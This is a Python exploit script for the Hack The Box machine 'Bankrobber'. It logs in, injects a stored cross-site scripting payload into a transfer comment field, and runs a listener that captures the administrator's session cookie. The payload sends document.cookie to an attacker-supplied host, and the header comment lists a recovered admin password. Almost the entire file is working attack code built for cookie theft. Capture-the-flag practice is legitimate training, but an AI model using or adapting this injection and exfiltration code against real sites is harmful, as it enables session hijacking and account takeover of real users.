'''
Bankrobber HTB - 15/02/2024
Admin Steal Cookie
Wait for 3-4 minutes to get the cookie

admin:Hopelessromantic
'''
import requests, socket, re, argparse, urllib3
from urllib.parse import unquote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', dest='target', help='Target Machine')
parser.add_argument('--user', '-u', dest='user', help='Username for register and login')
parser.add_argument('--pass', '-p', dest='password', help='Password for register and login')
parser.add_argument('--ip', '-ip', dest='ip', help='IP Attacker')
parser.add_argument('--port', '-po', dest='port', help='Port for listening')
args = parser.parse_args()

target = args.target
user = args.user
passw = args.password
ip = args.ip

login_url = f'https://{target}/login.php'
register_url = f'https://{target}/register.php'
send_url = f'http://{target}/user/transfer.php'
s = requests.Session()

http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def login():
    data = f"username={user}&password={passw}&pounds=Submit+Query"
    header = {'Content-type': 'application/x-www-form-urlencoded'}
    r = s.post(login_url, data=data, headers=header, allow_redirects=True, verify=False)
    if 'Transfer E-coin' in r.text:
        print("[+] Success login")
    else:
        print("[-] Invalid Credential, please check again")

def inject_xss():
    id_val = s.cookies.get_dict().get('id', None)
    payload = f"<script>var i=new Image;i.src=\"http://{ip}/?secret=\"%2bdocument.cookie;</script>"
    data = f"fromId={id_val}&toId=2&amount=10&comment={payload}"
    header = {'Content-type': 'application/x-www-form-urlencoded'}
    r = s.post(send_url, data=data, headers=header, verify=False, proxies=http_proxy)
    if 'You\'\re not authorized to view this page' not in r.text:
        print('[+] XSRF INJECTED!\nWait and check your nc ...')
    else:
        print('[-] You\'\re credentials is invalid')

def setup_socket():
    print("[*] Setting up socket to receive cookie")
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, 80))
    sock.listen()

    print(f'[i] Listening on {ip} port 80\n • Waiting to admin trigger XSS')
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    print('[+] Gotcha!')
    admin_cookie = re.search(b'secret=([^&\s]+)', get_request)
    admin_cookie = admin_cookie.group(1).decode('UTF-8')
    print("=> " + unquote(admin_cookie))
    return admin_cookie


def main():
    login()
    inject_xss()
    setup_socket()

if __name__ == "__main__":
    main()